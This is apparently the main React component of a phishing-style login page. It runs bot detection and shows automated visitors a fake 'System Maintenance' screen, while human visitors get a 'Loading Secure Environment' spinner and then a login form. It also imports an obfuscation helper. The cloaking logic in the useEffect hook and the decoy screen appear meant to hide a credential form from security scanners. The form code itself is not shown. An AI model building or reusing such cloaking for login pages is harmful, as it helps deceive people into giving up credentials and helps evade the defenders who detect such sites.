/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import { useEffect, useState } from 'react';
import { Header } from './components/Header';
import { HeroContent } from './components/Hero';
import { LoginForm } from './components/LoginForm';
import { Footer } from './components/Footer';
import { initSecurity, isBot, obfuscate } from './utils/security';

export default function App() {
  const [isVerified, setIsVerified] = useState(false);
  const [botDetected, setBotDetected] = useState(false);

  useEffect(() => {
    initSecurity();
    if (isBot()) {
      setBotDetected(true);
    }
    
    // Auto-verify after a short delay to simulate human interaction
    const timer = setTimeout(() => setIsVerified(true), 1500);
    return () => clearTimeout(timer);
  }, []);

  if (botDetected) {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center p-8 text-center">
        <div className="max-w-md space-y-4">
          <h1 className="text-2xl font-bold text-gray-800">System Maintenance</h1>
          <p className="text-gray-600">The service is currently undergoing scheduled maintenance. Please check back later.</p>
          <div className="w-12 h-12 border-4 border-blue-500 border-t-transparent rounded-full animate-spin mx-auto"></div>
        </div>
      </div>
    );
  }

  if (!isVerified) {
    return (
      <div className="min-h-screen bg-white flex items-center justify-center">
        <div className="flex flex-col items-center space-y-4">
          <div className="w-10 h-10 border-4 border-gray-200 border-t-blue-500 rounded-full animate-spin"></div>
          <p className="text-sm text-gray-400 font-medium tracking-widest uppercase">Loading Secure Environment...</p>
        </div>
      </div>
    );
  }

  return (

    <div className="min-h-screen bg-[#f7f9fc] flex flex-col font-sans">
      <Header />
      
      <main className="flex-1 flex flex-col relative overflow-hidden">
        {/* Subtle Background Graphics */}
        <div className="absolute inset-0 -z-10 bg-white">
          <div className="absolute bottom-0 left-0 w-full h-1/2 bg-gradient-to-t from-blue-50/30 to-transparent"></div>
        </div>

        <div className="max-w-7xl mx-auto w-full flex-1 flex items-center justify-center py-8 px-8">
          <div className="w-full grid grid-cols-1 lg:grid-cols-2 gap-16 items-center">
            <div className="flex justify-center lg:justify-start opacity-0 animate-fade-in animation-delay-500 fill-mode-forwards">
              <HeroContent />
            </div>
            <div className="flex justify-center lg:justify-end opacity-0 animate-fade-in animation-delay-1000 fill-mode-forwards">
              <LoginForm />
            </div>
          </div>
        </div>
      </main>

      <Footer />
    </div>
  );
}


